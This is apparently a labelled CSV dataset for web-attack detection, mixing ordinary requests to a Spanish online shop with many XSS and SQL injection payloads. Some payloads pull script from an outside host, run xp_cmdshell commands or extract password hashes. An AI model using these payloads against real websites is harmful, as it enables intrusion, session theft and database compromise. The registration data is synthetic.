payload,type
global/creditos.jsp,normal
"ABC<div style=""x:\xE2\x80\x8Bexpression(javascript:alert(1)"">DEF",xss
publico/vaciar.jsp?B2=Vaciar+carrito,normal
mirambell donet,normal
publico/registro.jsp?modo=registro&login=duljit&password=regi0ona2&nombre=Ros%E1ngela&apellidos=Sit%FA+Agulla&email=nissen%40hipersevilla.af&dni=07077546D&direccion=Passatge+Brancatges%2C+104+&ciudad=Granyena+de+Segarra&cp=12527&provincia=Salamanca&ntc=1026055264847672&B1=Registrar,normal
"<img src=""javascript:alert('XSS');"">",xss
"<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'""-->",xss
pittner,normal
publico/registro.jsp?modo=registro&login=vadi&password=Calif%F3rnico&nombre=Jerusal%E9n&apellidos=Gering&email=dantas.pellegrim4%40nanotecnologo.kr&dni=73502486Y&direccion=Escuelas+148%2C+&ciudad=Villarejo+del+Valle&cp=05412&provincia=Zamora&ntc=2774742421964079&B1=Registrar,normal
imagenes/3.gif,normal
jenner,normal
4.68E+15,normal
global/creditos.jsp,normal
publico/miembros.jsp,normal
'; exec master..xp_cmdshell 'ping 10.10.1.2'--,sqli
miembros/imagenes/ogono.jpg,normal
publico/productos.jsp,normal
"<img dynsrc=""javascript:document.vulnerable=true;"">",xss
&lt;STYLE&gt;.XSS{background-image:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;,xss
miembros/fotos.jsp,normal
publico/autenticar.jsp?modo=entrar&login=magdalen1&pwd=30hi6h571Ar&remember=on&B1=Entrar,normal
publico/registro.jsp?modo=registro&login=dueppen&password=lI74Re04&nombre=Naiemias&apellidos=Salazar+Borja&email=perr%40pasajesaereosbaratos.pm&dni=83042756Z&direccion=Calle+Villa+De+Andorra+36+9%3FB&ciudad=Borriol&cp=04270&provincia=Soria&ntc=5118232940986144&B1=Registrar,normal
imagenes/cmenbul.gif,normal
"<marquee onScroll marquee onScroll=""javascript:javascript:alert(1)""></marquee onScroll>",xss
"ABC<div style=""x:\x0Aexpression(javascript:alert(1)"">DEF",xss
50757533y,normal
miembros/fotos.jsp,normal
"<img src=x onerror=\x11""javascript:alert(1)"">",xss
imagenes/nuestratierra.jpg,normal
global/titulo.jsp,normal
global/creditos.jsp,normal
imagenes/cmenbul.gif,normal
madrigal puigb,normal
imagenes/3.gif,normal
"&onUE: select * from users where id=1 or \<$ union select 1,@@VERSION -- 1",sqli
terraje,normal
&lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;,xss
imagenes/2.gif,normal
publico/miembros.jsp,normal
imagenes/cmenbul.gif,normal
"c/ antonio gonzalez suarez, 44, 11?c",normal
"UEov,: select * from users where id=1 union select !<@,version() -- 1",sqli
publico/miembros.jsp,normal
"UEvo,: select * from users where id=1 union select @<@,version() -- 1",sqli
miembros/salir.jsp,normal
"s(UE1: select * from users where id=1 or 1#""( union select 1,version() -- 1",sqli
global/titulo.jsp,normal
24443,normal
"s?)s: select * from users where id=1 or ""])"" or 1=1 -- 1",sqli
miembros/imagenes/zarauz.jpg,normal
henrikson@hojainformativas.int,normal
"<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">",xss
7.80E+15,normal
"<body onfocus body onfocus=""javascript:javascript:alert(1)""></body onfocus>",xss
*/UNION%20SELECT%20password%20FROM%20users--,sqli
publico/productos.jsp,normal
coxcojita,normal
<scr<script>ipt>alert(document.cookie)</scr</script>ipt>,xss
publico/pagar.jsp?modo=insertar&precio=9570&B1=Confirmar,normal
"<img SRC=""jav ascript:document.vulnerable=true;"">",xss
""">/KinG-InFeT.NeT/><script>alert(document.cookie)</script>",xss
global/titulo.jsp,normal
cortegana,normal
"0\""autofocus/onfocus=alert(1)--><video/poster/ error=prompt(2)>""-confirm(3)-""",xss
miembros/imagenes/castro.jpg,normal
global/estilos.css,normal
publico/caracteristicas.jsp?id=2,normal
"c/ mijancas, 154 3?c",normal
"<STYLE>li {list-style-image: url(\""javascript:alert('XSS')\"");}</STYLE><UL><LI>XSS",xss
imagenes/1.gif,normal
imagenes/1.gif,normal
82768054r,normal
<img src ?itworksonchrome?\/onerror = alert(1),xss
publico/pagar.jsp?modo=insertar&precio=7492&B1=Pasar+por+caja,normal
jquery.shuffle.modernizr.min.js,normal
"<iframe onReadyStateChange iframe onReadyStateChange=""javascript:javascript:alert(1)""></iframe onReadyStateChange>",xss
imagenes/logo.gif,normal
"1o)UE: select * from users where id=1 + (\+) union select null,@@VERSION -- 1",sqli
duchement tenza,normal
00699529f,normal
"sov(1: select * from users where id='1' + @(1) union select 1,version() -- 1'",sqli
1157,normal
"<BGSOUND SRC=""javascript:alert('XSS');"">",xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
nahid,normal
balcells parets,normal
publico/miembros.jsp,normal
"<body BACKGROUND=""javascript:document.vulnerable=true;"">",xss
mo3tren04,normal
imagenes/cmenbul.gif,normal
publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=100&cantidad=43&B1=A%F1adir+al+carrito,normal
publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=100&cantidad=69&B1=A%F1adir+al+carrito,normal
"<IMG LOWSRC=""javascript:alert('XSS')"">",xss
"<TABLE BACKGROUND=""javascript:alert('XSS')"">",xss
castell sargatal,normal
"<img src\x12=x onerror=""javascript:alert(1)"">",xss
22513,normal
"<img \x11src=x onerror=""javascript:alert(1)"">",xss
rittenho,normal
publico/caracteristicas.jsp?id=1,normal
1450,normal
"<table BACKGROUND=""javascript:document.vulnerable=true;"">",xss
"<a href=""javas\x08cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
imagenes/logo.gif,normal
publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=85&cantidad=40&B1=A%F1adir+al+carrito,normal
miembros/editar.jsp?modo=registro&login=hanzlice&password=ras4RojAR&nombre=Thayra&apellidos=Guardiola+Puertolas&email=bearse%40cdgranadabaila.lv&dni=32493489D&direccion=C%2F+Portal+De+Zamudio+65%2C+&ciudad=Sant+Andreu+Salou&cp=37120&provincia=C%E1ceres&ntc=5385467629611173&B1=Registrar,normal
"&voo1: select * from users where id=1 or @<@=1 union select 1,version() -- 1",sqli
publico/productos.jsp,normal
47209,normal
or 1=1--,sqli
miembros/salir.jsp,normal
publico/miembros.jsp,normal
imagenes/logo.gif,normal
publico/carrito.jsp,normal
index.jsp,normal
"exp/*&lt;A STYLE='no\xss&#58;noxss(\""*//*\"");",xss
robin@comerciosdeaspe.info,normal
miembros/fotos.jsp,normal
alabiada,normal
6110,normal
miembros/index.jsp,normal
regueras de arriba,normal
9043,normal
publico/miembros.jsp,normal
publico/pagar.jsp?modo=insertar&precio=178&B1=Pasar+por+caja,normal
sparksma,normal
arnal martagn,normal
global/menum.jsp,normal
global/titulo.jsp,normal
publico/productos.jsp,normal
miembros/imagenes/zarauz.jpg,normal
publico/caracteristicas.jsp?id=1,normal
03621656f,normal
1689,normal
9041,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
dropin8,normal
"<a href=""\x02javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"o..UE: select * from users where id=1<@.. union select 1,version() -- 1",sqli
>%22%27><img%20src%3d%22javascript:alert(%27%20XSS%27)%22>,xss
"window.alert(""Bonjour !"");",xss
"<;<;SCRIPT>;alert("";XSS"";);//<;<;/SCRIPT>;",xss
publico/carrito.jsp,normal
9ar5i04o,normal
publico/registro.jsp?modo=registro&login=francois&password=patay&nombre=Gina&apellidos=Rofes&email=brando%40elsentidodelavida.lc&dni=61877469V&direccion=Hoyo+Higueron+32+3-F&ciudad=Herrer%EDa&cp=08880&provincia=Sevilla&ntc=6691710338743371&B1=Registrar,normal
entrepalmadura,normal
global/creditos.jsp,normal
<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?,xss
"<img\x13src=x onerror=""javascript:alert(1)"">",xss
"<svg onResize svg onResize=""javascript:javascript:alert(1)""></svg onResize>",xss
"UEvnn: select * from users where id=1 union select @ $_,version() -- 1",sqli
&lt;BGSOUND SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;,xss
sangborivutr@ssextremadura.gr,normal
"1234 "" AND 1=0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",sqli
flloko-humet@imarbella.ms,normal
publico/registro.jsp?modo=registro&login=wookie&password=ven1no&nombre=Nicanora&apellidos=Laborin+Arancibia&email=goring%40quadernideilgarda.pl&dni=94046799Y&direccion=C%2F+Sahagun+142+&ciudad=Vall%E9s&cp=50690&provincia=La+Rioja&ntc=9490117587717675&B1=Registrar,normal
michalopoulos8@aprendeaestudiar.vn,normal
global/creditos.jsp,normal
global/titulo.jsp,normal
publico/pagar.jsp?modo=insertar&precio=6429&B1=Pasar+por+caja,normal
miembros/imagenes/zarauz.jpg,normal
publico/registro.jsp?modo=registro&login=fergus&password=99oRTaDeRo&nombre=Carmi%F1a&apellidos=Gruart+Ola&email=woll%40stockdefotos.bb&dni=74799380E&direccion=Avda.+Somosaguas+150%2C+1%3FB&ciudad=Castil+de+Peones&cp=44561&provincia=Badajoz&ntc=3580665595349534&B1=Registrar,normal
"""'`><\x3Cimg src=xxx:x onerror=javascript:alert(1)>",xss
9.53E+15,normal
PRINT,sqli
imagenes/2.gif,normal
"<IMG SRC=x onblur=""alert(String.fromCharCode(88,83,83))"">",xss
imagenes/1.gif,normal
"<DIV STYLE=""width: expression(alert('XSS'));"">",xss
linton,normal
""" onfocus=alert(document.domain) ""> <""",xss
"<;IMG SRC="";jav&;#x09;ascript:alert(';XSS';);"";>;",xss
global/creditos.jsp,normal
"<object classid=""clsid:..."" codebase=""javascript:document.vulnerable=true;"">",xss
"&(.)o: select * from users where id=1 or (\.)=1 union select 1,@@VERSION -- 1",sqli
imagenes/2.gif,normal
13791863m,normal
imagenes/2.gif,normal
&lt;IMG SRC=javascript&#058;alert(&quot;XSS&quot;)&gt;,xss
torre-cardela,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
"<meta http-equiv=""refresh"" content=""0;url=javascript:confirm(1)"">",xss
&o1&1: select * from users where id=1 or \<1 or 1=1 -- 1,sqli
"<? echo('<SCR)';echo('IPT>alert(""XSS"")</SCRIPT>'); ?>",xss
desnuda,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
publico/miembros.jsp,normal
"<img src\x09=x onerror=""javascript:alert(1)"">",xss
publico/autenticar.jsp?modo=entrar&login=sile&pwd=banqueta&remember=on&B1=Entrar,normal
"calle alfaz del pi, 96 11?d",normal
publico/autenticar.jsp?modo=entrar&login=beatty64&pwd=propaganda&remember=off&B1=Entrar,normal
87348482w,normal
"<head><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-document.vulnerable=true;+ADw-/SCRIPT+AD4-",xss
publico/registro.jsp?modo=registro&login=ezri&password=mo%21ralidad&nombre=Isaciar&apellidos=Foixenc+Illanes&email=renan1%40fichajes.nom.sd&dni=75730563G&direccion=C%2F+Echegaray+S%2FN%2C+&ciudad=Chueca&cp=23628&provincia=Alicante&ntc=0106099240126772&B1=Registrar,normal
miembros/imagenes/castro.jpg,normal
miembros/salir.jsp,normal
depredador,normal
"<img src=""x` `<script>javascript:alert(1)</script>""` `>",xss
miembros/index.jsp,normal
miembros/imagenes/ogono.jpg,normal
miembros/editar.jsp?modo=registro&login=aleksand&password=cerramiento&nombre=Gerarda&apellidos=Lao&email=shukuri%40velaconsultores.nl&dni=54415049Q&direccion=Pasaje+Pedrosa+115%2C+6F&ciudad=Mieza&cp=47400&provincia=C%E1ceres&ntc=5563798964634481&B1=Registrar,normal
publico/productos.jsp,normal
"<STYLE>.XSS{background-image:url(""javascript:alert('XSS')"");}</STYLE><A CLASS=XSS></A>",xss
"passeig picasso, 23,",normal
miembros/fotos.jsp,normal
4.44E+15,normal
for26same8te,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
33245427p,normal
<embed code=%(scriptlet)s></embed>,xss
08686877f,normal
publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=100&cantidad=32&B1=A%F1adir+al+carrito,normal
miembros/editar.jsp?modo=registro&login=masao&password=7U6CaN*i2A04%D3n&nombre=Zidanelia&apellidos=Saleta&email=mitchum%40prestoesesto.gd&dni=94845655A&direccion=El+Reyezuelo%2C+15+&ciudad=San+Vicente+de+la+Cabeza&cp=10459&provincia=Le%F3n&ntc=2785803703823487&B1=Registrar,normal
'; exec master..xp_cmdshell 'ping 172.10.1.255'--,sqli
"<style>li {list-style-image: url(""javascript:document.vulnerable=true;"");</STYLE><UL><LI>XSS",xss
"exp/*<;XSS STYLE=';no\xss:noxss("";*//*"";);",xss
imagenes/2.gif,normal
global/menum.jsp,normal
publico/caracteristicas.jsp?id=2,normal
28529,normal
imagenes/cmenbul.gif,normal
nehemiah,normal
miembros/salir.jsp,normal
imagenes/3.gif,normal
<script <B>document.vulnerable=true;</script>,xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
publico/registro.jsp?modo=registro&login=azmeena&password=nemea&nombre=Ventura&apellidos=Busqu%E9&email=duornik-gracia%40zeat.pt&dni=78248698F&direccion=Siena+76+8-C&ciudad=Yebra+de+Basa&cp=36574&provincia=Salamanca&ntc=0197876956887475&B1=Registrar,normal
publico/caracteristicas.jsp?id=1,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
koczian@decoaching.is,normal
miembros/index.jsp,normal
"""><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>",xss
bevis,normal
"calle hostieros, 24",normal
publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=64&B1=A%F1adir+al+carrito,normal
miembros/salir.jsp,normal
publico/pagar.jsp?modo=insertar&precio=1152&B1=Pasar+por+caja,normal
02877417w,normal
global/estilos.css,normal
8.00E+14,normal
1oo&1: select * from users where id=1 + \+%\ or 1=1 -- 1,sqli
"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:alert('XSS');"">",xss
imagenes/1.gif,normal
miembros/salir.jsp,normal
1.28E+15,normal
dinaband,normal
slezak@ballerpoker.kn,normal
publico/registro.jsp?modo=registro&login=chiykows&password=93tIp72ar&nombre=Wara&apellidos=Caball%E9&email=beverly.lormer%40decobiombo.ni&dni=81037080F&direccion=Particular+Basterra+108+&ciudad=Berriz&cp=47882&provincia=Zamora&ntc=7984505831107491&B1=Registrar,normal
publico/pagar.jsp?modo=insertar&precio=8432&B1=Pasar+por+caja,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
miembros/fotos.jsp,normal
<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>,xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
miembros/editar.jsp?modo=registro&login=mareah&password=malh5jo&nombre=Eulalio&apellidos=Tal%F3+Gorriz&email=trissenaar%40tetdevelocidad.uk&dni=18684547Z&direccion=C%2F+Hermanos+Senise+Colmenero%2C+153%2C+3-D&ciudad=Forua&cp=08470&provincia=Valencia&ntc=9004541540453342&B1=Registrar,normal
<script /**/>/**/alert(1)/**/</script /**/,xss
miembros/editar.jsp?modo=registro&login=severn5&password=02048n3ad1&nombre=Eugenio&apellidos=Pall%E0s+De+Buran&email=walker%40ebaz.vi&dni=88253687L&direccion=Calle+Playa+Del+Carmen%2C+178%2C+2%3FD&ciudad=Marazuela&cp=45510&provincia=Salamanca&ntc=0639487553835350&B1=Registrar,normal
7250,normal
90946866j,normal
"ABC<div style=""x:\x0Bexpression(javascript:alert(1)"">DEF",xss
"<TABLE BACKGROUND=""javascript:alert('XSS')"">",xss
1596,normal
global/menum.jsp,normal
global/titulo.jsp,normal
19310,normal
amenta,normal
publico/autenticar.jsp?modo=entrar&login=smoot&pwd=desvanecido&remember=on&B1=Entrar,normal
"<body onUnload body onUnload=""javascript:javascript:alert(1)""></body onUnload>",xss
solana de los barros,normal
"<li style=list-style:url() onerror=javascript:alert(1)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1)></div>",xss
miembros/imagenes/castro.jpg,normal
publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=15&B1=A%F1adir+al+carrito,normal
publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=35&B1=A%F1adir+al+carrito,normal
"\"";alert('XSS');//",xss
"<TABLE BACKGROUND=""javascript:alert('XSS')"">",xss
imagenes/logo.gif,normal
publico/productos.jsp,normal
global/creditos.jsp,normal
11203636z,normal
publico/carrito.jsp,normal
imagenes/3.gif,normal
"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",xss
imagenes/1.gif,normal
publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=39&cantidad=61&B1=A%F1adir+al+carrito,normal
23550240b,normal
mcavoy-zabczynski@discotecateatre.gt,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
<video poster=javascript:javascript:alert(1)//,xss
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=3)) AND 'i'='i",sqli
m+ar8ca4,normal
miembros/imagenes/zarauz.jpg,normal
leafloor,normal
stiefel8@spainbareback.eu,normal
publico/miembros.jsp,normal
"<;STYLE TYPE="";text/javascript"";>;alert(';XSS';);<;/STYLE>;",xss
"`""'><img src=xxx:x \x09onerror=javascript:alert(1)>",xss
1 and user_name() = 'dbo',sqli
publico/registro.jsp?modo=registro&login=marg&password=77603O8adA&nombre=Brayam&apellidos=Cheres+Ochoa&email=salvilla%40mtos.pr&dni=02124892Z&direccion=Petxina%2C+77%2C+2B&ciudad=Vallanca&cp=34475&provincia=Valencia&ntc=6113595872626667&B1=Registrar,normal
&lt;OBJECT TYPE=&quot;text/x-scriptlet&quot; DATA=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/OBJECT&gt;,xss
<<SCRIPT>document.vulnerable=true;//<</SCRIPT>,xss
imagenes/nuestratierra.jpg,normal
imagenes/1.gif,normal
mantencin,normal
\x3c,xss
"<script onReadyStateChange script onReadyStateChange=""javascript:javascript:alert(1)""></script onReadyStateChange>",xss
tracz,normal
global/titulo.jsp,normal
jquery.backstretch.min.js,normal
miembros/editar.jsp?modo=registro&login=drennan&password=5e56ir2&nombre=Nadal&apellidos=Caravantes&email=bohlen_newtell%40lodgemadrid.it&dni=25137442Y&direccion=Lugar+Higuera+Canaria%2C+169+&ciudad=Abia+de+la+Obispal%EDa&cp=08282&provincia=Girona&ntc=8541242880536778&B1=Registrar,normal
9380,normal
"no)UE: select * from users where id=1 + ($+) union select null,@@VERSION -- 1",sqli
"<! foo=""[[[Inception]]""><x foo=""]foo><script>javascript:alert(1)</script>"">",xss
"<a href=""jAvAsCrIpT&colon;alert&lpar;1&rpar;"">X</a>",xss
centeno,normal
castillejo de meslen,normal
global/titulo.jsp,normal
<b <script>alert(1)</script>0,xss
&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;,xss
miembros/index.jsp,normal
'; exec xp_regread,sqli
index.jsp,normal
atolera,normal
4725,normal
calle arins 87 4?e,normal
<BODY ONLOAD=javascript:alert(1)>,xss
miembros/imagenes/ogono.jpg,normal
global/estilos.css,normal
imagenes/2.gif,normal
byoung,normal
miembros/fotos.jsp,normal
publico/autenticar.jsp?modo=entrar&login=jacobsen&pwd=ayunQue&remember=on&B1=Entrar,normal
miembros/imagenes/castro.jpg,normal
thirugna,normal
XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>,xss
"<EMBED SRC=""data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="" type=""image/svg+xml"" AllowScriptAccess=""always""></EMBED>",xss
riguier_waits3@copiar.com.gl,normal
es3regamiento,normal
"<INPUT TYPE=""IMAGE"" SRC=""javascript:javascript:alert(1);"">",xss
antih sacido,normal
7315,normal
"&lt;HEAD&gt;&lt;META HTTP-EQUIV=\""CONTENT-TYPE\"" CONTENT=\""text/html; charset=UTF-7\""&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",xss
gaviota 13,normal
llasera,normal
imagenes/3.gif,normal
publico/pagar.jsp?modo=insertar&precio=9678&B1=Confirmar,normal
publico/pagar.jsp?modo=insertar&precio=318&B1=Confirmar,normal
"<html onMouseEnter html onMouseEnter=""javascript:parent.javascript:alert(1)""></html onMouseEnter>",xss
miembros/editar.jsp?modo=registro&login=misczak&password=prestamente&nombre=Daciano&apellidos=Fredes+Damas&email=mayworth%40sms24h.tr&dni=83835081N&direccion=Cami%F1o+Canexa+161+11%3FG&ciudad=Sencelles&cp=16842&provincia=Burgos&ntc=6343513594517926&B1=Registrar,normal
